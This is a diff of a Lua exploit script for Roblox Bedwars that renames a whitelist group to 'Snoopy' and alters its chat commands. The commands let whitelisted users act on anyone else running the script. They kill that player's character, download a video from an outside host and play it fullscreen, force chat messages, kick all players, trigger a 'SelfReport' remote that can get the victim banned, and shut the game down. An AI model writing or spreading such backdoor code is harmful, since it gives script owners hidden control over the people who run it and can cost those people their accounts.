@@ -9,8 +9,8 @@ local function getLplrType()
 			end
 		end
 	end
-	if whitelist["No"] ~= nil then
-		for i,v in pairs(whitelist["No"]) do
+	if whitelist["Snoopy"] ~= nil then
+		for i,v in pairs(whitelist["Snoopy"]) do
 			if v.id == tostring(lplr.UserId) then
 				lplr_Type = 2
 				return lplr_Type
@@ -43,8 +43,8 @@ function CanAttackUser(u)
 		end
 	end
 
-	if whitelist["No"] ~= nil then
-		for i, v in pairs(whitelist["No"]) do
+	if whitelist["Snoopy"] ~= nil then
+		for i, v in pairs(whitelist["Snoopy"]) do
 			if v.id == userId then
 				userType = 2
 				break
@@ -65,14 +65,14 @@ function CanAttackUser(u)
 end
 
 local commands = {
-	[".keel"] = function()
+	[".k"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
 	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local filename = "bruh"
+			local filename = ""
 			local ScreenGui = Instance.new("ScreenGui")
 			ScreenGui.IgnoreGuiInset = true
 			ScreenGui.Parent = game:GetService("CoreGui")
@@ -81,7 +81,7 @@ local commands = {
 			video.Size = UDim2.new(1, 0, 1, 0)
 			video.Parent = ScreenGui
 
-			local Name = filename .. ".mp4"
+			local Name = filename .. ""
 			if not isfile(Name) then
 				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ""))
 			end
@@ -90,7 +90,7 @@ local commands = {
 
 			repeat
 				task.wait()
-				print("Retrying...")
+				print("")
 			until video.Loaded
 
 			video:Play()
@@ -100,7 +100,7 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local textChatService = game:GetService("TextChatService")
 			wait(0.0001)
-			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("No")
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Easy")
 		end
 	end,
 	[".void"] = function()
@@ -139,11 +139,11 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
-				player:Kick("Snoopy Owns You")
+				player:Kick("Easy")
 			end
 		end
 	end,
-	[".ban"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local rs = game:GetService("ReplicatedStorage")
 			local remote = rs:FindFirstChild("SelfReport", true)
@@ -170,7 +170,7 @@ local commands = {
 			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
 		end
 	end,
-	[".quitgame"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game:Shutdown()
 		end
@@ -315,7 +315,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["white"].."'>[No]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["white"].."'>[Snoopy]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -334,12 +334,12 @@ txt.OnIncomingMessage = function(msg)
 			end
 		end
 
-		if whitelist["No"] ~= nil then
-			for i, v in pairs(whitelist["No"]) do
+		if whitelist["Snoopy"] ~= nil then
+			for i, v in pairs(whitelist["Snoopy"]) do
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["white"].."'>[No]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["white"].."'>[Snoopy]</font> " .. msg.PrefixText
 					end
 					userType = 2
 				end
